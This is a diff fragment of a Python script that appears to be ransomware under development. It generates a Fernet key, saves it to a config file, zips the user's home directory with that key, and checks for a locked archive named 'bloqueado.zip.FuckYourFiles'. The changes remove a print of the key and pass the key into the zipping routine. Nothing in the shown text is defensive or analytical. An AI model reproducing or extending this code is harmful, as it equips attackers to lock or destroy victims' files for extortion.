@@ -2,16 +2,12 @@ import os
 import shutil
 import smtplib
 import socket
-import sys
 import urllib.request
-from distutils.log import info
 from os.path import exists
 from pathlib import Path
 from time import sleep
-from types import ClassMethodDescriptorType
 
 import psutil
-import pyzipper
 from cryptography.fernet import Fernet
 from requests import get
 
@@ -24,15 +20,13 @@ while True:
     if exists(f'{userPath}/bloqueado.zip.FuckYourFiles'):
         with open('config/filekey.key', 'r') as filekey:
             key = filekey.read()
-        print(key)
         break
     else:
-
         key = Fernet.generate_key()
         with open('config/filekey.key', 'wb') as filekey:
             filekey.write(key)
-
-    zip_folderPyzipper(userPath, '/')
+            sleep(1)
+    zip_folderPyzipper(userPath, '/', key)
 
     for filename in os.listdir(userPath):
         filepath = os.path.join(userPath, filename)
